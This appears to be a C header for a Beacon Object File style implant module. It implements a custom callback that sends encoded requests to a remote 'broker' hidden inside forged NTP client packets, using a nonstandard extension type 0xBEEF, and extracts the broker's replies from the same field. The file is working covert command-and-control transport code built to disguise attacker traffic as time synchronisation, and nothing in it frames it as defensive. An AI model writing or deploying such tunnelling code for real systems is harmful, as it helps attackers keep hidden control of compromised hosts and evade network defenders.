#pragma once

#include <winsock2.h>
#include <windows.h>
#include <string.h>

#ifndef KERNEL32$GetProcessHeap
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
#endif
#ifndef KERNEL32$HeapAlloc
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
#endif
#ifndef KERNEL32$HeapFree
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
#endif
#ifndef KERNEL32$GetSystemTimeAsFileTime
DECLSPEC_IMPORT VOID WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
#endif
#ifndef MSVCRT$printf
DECLSPEC_IMPORT int MSVCRT$printf(const char *format, ...);
#endif
#ifndef MSVCRT$strlen
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);
#endif
#ifndef WS2_32$WSAStartup
DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
#endif
#ifndef WS2_32$socket
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
#endif
#ifndef WS2_32$setsockopt
DECLSPEC_IMPORT int WSAAPI WS2_32$setsockopt(SOCKET, int, int, const char *, int);
#endif
#ifndef WS2_32$connect
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr *, int);
#endif
#ifndef WS2_32$send
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char *, int, int);
#endif
#ifndef WS2_32$recv
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char *, int, int);
#endif
#ifndef WS2_32$closesocket
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
#endif
#ifndef WS2_32$WSACleanup
DECLSPEC_IMPORT int WSAAPI WS2_32$WSACleanup();
#endif
#ifndef WS2_32$htonl
DECLSPEC_IMPORT u_long WSAAPI WS2_32$htonl(u_long);
#endif
#ifndef WS2_32$ntohl
DECLSPEC_IMPORT u_long WSAAPI WS2_32$ntohl(u_long);
#endif
#ifndef WS2_32$htons
DECLSPEC_IMPORT u_short WSAAPI WS2_32$htons(u_short);
#endif
#ifndef WS2_32$ntohs
DECLSPEC_IMPORT u_short WSAAPI WS2_32$ntohs(u_short);
#endif
#ifndef WS2_32$inet_addr
DECLSPEC_IMPORT unsigned long WSAAPI WS2_32$inet_addr(const char *cp);
#endif

#define BROKER_TIMEOUT_MS 5000
#define MAX_DATAGRAM_SIZE 65535
#define NTP_HEADER_LEN 48
#define NTP_EXTENSION_TYPE 0xBEEF
#define FILETIME_UNIX_EPOCH_SECS 11644473600ULL
#define NTP_UNIX_EPOCH_SECS 2208988800ULL

static WORD alignToDword(WORD length)
{
    return (WORD)((length + 3) & ~3);
}

static void writeNtpTimestamp(BYTE *dest)
{
    FILETIME ft;
    ULONGLONG filetimeTicks;
    ULONGLONG totalSeconds;
    ULONGLONG unixSeconds;
    ULONGLONG ntpSeconds;
    ULONGLONG fractionalTicks;
    DWORD fractional;
    DWORD secNetwork;
    DWORD fracNetwork;

    KERNEL32$GetSystemTimeAsFileTime(&ft);
    filetimeTicks = ((ULONGLONG)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    totalSeconds = filetimeTicks / 10000000ULL;
    unixSeconds = totalSeconds - FILETIME_UNIX_EPOCH_SECS;
    ntpSeconds = unixSeconds + NTP_UNIX_EPOCH_SECS;
    fractionalTicks = filetimeTicks % 10000000ULL;
    fractional = (DWORD)((fractionalTicks * 0x100000000ULL) / 10000000ULL);

    secNetwork = WS2_32$htonl((DWORD)ntpSeconds);
    fracNetwork = WS2_32$htonl(fractional);
    memcpy(dest, &secNetwork, sizeof(DWORD));
    memcpy(dest + sizeof(DWORD), &fracNetwork, sizeof(DWORD));
}

static char *customCallback(const char *encodedRequest, const char *host, INTERNET_PORT port)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    SOCKET sock = INVALID_SOCKET;
    BOOL wsaStarted = FALSE;
    char *recvBuf = NULL;
    char *responseBuf = NULL;
    MSVCRT$printf("[customCallback] received request for %s:%u\n", host ? host : "", (unsigned int)port);

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    if (host == NULL || host[0] == '\0') {
        MSVCRT$printf("[customCallback] missing host for broker connection\n");
        return NULL;
    }

    WSADATA wsaData;
    int result = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        MSVCRT$printf("[customCallback] WSAStartup failed: %d\n", result);
        return NULL;
    }

    wsaStarted = TRUE;

    sock = WS2_32$socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        MSVCRT$printf("[customCallback] socket creation failed\n");
        goto cleanup;
    }

    DWORD timeout = BROKER_TIMEOUT_MS;
    WS2_32$setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
    WS2_32$setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));

    struct sockaddr_in brokerAddr;
    brokerAddr.sin_family = AF_INET;
    brokerAddr.sin_port   = WS2_32$htons(port);
    brokerAddr.sin_addr.S_un.S_addr = WS2_32$inet_addr(host);

    if (WS2_32$connect(sock, (SOCKADDR *)&brokerAddr, sizeof(brokerAddr)) == SOCKET_ERROR) {
        MSVCRT$printf("[customCallback] failed to connect to broker %s:%u\n", host, (unsigned int)port);
        goto cleanup;
    }

    WORD payloadLen = (WORD)(sizeof(DWORD) + reqLen);
    WORD extensionLen = alignToDword((WORD)(payloadLen + sizeof(WORD) * 2));
    DWORD packetLen = NTP_HEADER_LEN + extensionLen;

    char *packet = (char *)KERNEL32$HeapAlloc(hHeap, 0, packetLen);
    if (packet == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for NTP packet\n");
        goto cleanup;
    }

    memset(packet, 0, packetLen);
    packet[0] = (BYTE)((0 << 6) | (4 << 3) | 3); // LI = 0, VN = 4, Mode = 3 (client)
    packet[1] = 0;                                // stratum (unsynchronised)
    packet[2] = 6;                                // poll interval
    packet[3] = 0xEC;                             // precision (-20)
    memcpy(packet + 12, "INIT", 4);               // reference ID
    writeNtpTimestamp((BYTE *)packet + 40);       // transmit timestamp

    WORD *extension = (WORD *)(packet + NTP_HEADER_LEN);
    extension[0] = WS2_32$htons(NTP_EXTENSION_TYPE);
    extension[1] = WS2_32$htons(extensionLen);

    BYTE *valueStart = (BYTE *)(extension + 2);
    DWORD reqLenNetwork = WS2_32$htonl(reqLen);
    memcpy(valueStart, &reqLenNetwork, sizeof(DWORD));
    memcpy(valueStart + sizeof(DWORD), encodedRequest, reqLen);

    int sent = WS2_32$send(sock, packet, (int)packetLen, 0);
    KERNEL32$HeapFree(hHeap, 0, packet);
    if (sent != (int)packetLen) {
        MSVCRT$printf("[customCallback] failed to send NTP request packet\n");
        goto cleanup;
    }

    recvBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, MAX_DATAGRAM_SIZE);
    if (recvBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for receive buffer\n");
        goto cleanup;
    }

    int received = WS2_32$recv(sock, recvBuf, MAX_DATAGRAM_SIZE, 0);
    if (received < (int)(NTP_HEADER_LEN + sizeof(WORD) * 2 + sizeof(DWORD))) {
        MSVCRT$printf("[customCallback] failed to receive valid NTP response\n");
        goto cleanup;
    }

    WORD responseExtLen = WS2_32$ntohs(*(WORD *)(recvBuf + NTP_HEADER_LEN + sizeof(WORD)));
    WORD responseExtType = WS2_32$ntohs(*(WORD *)(recvBuf + NTP_HEADER_LEN));
    if (responseExtType != NTP_EXTENSION_TYPE || responseExtLen < sizeof(WORD) * 2 + sizeof(DWORD)) {
        MSVCRT$printf("[customCallback] invalid NTP extension in response\n");
        goto cleanup;
    }

    if ((int)(NTP_HEADER_LEN + responseExtLen) > received) {
        MSVCRT$printf("[customCallback] truncated NTP response received\n");
        goto cleanup;
    }

    BYTE *respValue = (BYTE *)(recvBuf + NTP_HEADER_LEN + sizeof(WORD) * 2);
    DWORD responseLen = WS2_32$ntohl(*(DWORD *)respValue);
    DWORD available = responseExtLen - sizeof(WORD) * 2 - sizeof(DWORD);

    if (responseLen == 0 || responseLen > available) {
        MSVCRT$printf("[customCallback] invalid response length in NTP payload\n");
        goto cleanup;
    }

    responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, responseLen + 1);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        goto cleanup;
    }

    memcpy(responseBuf, respValue + sizeof(DWORD), responseLen);
    responseBuf[responseLen] = '\0';

    MSVCRT$printf("[customCallback] received %lu bytes from NTP broker\n", (unsigned long)responseLen);

cleanup:
    if (recvBuf != NULL) {
        KERNEL32$HeapFree(hHeap, 0, recvBuf);
    }
    if (sock != INVALID_SOCKET) {
        WS2_32$closesocket(sock);
    }
    if (wsaStarted) {
        WS2_32$WSACleanup();
    }

    return responseBuf;
}
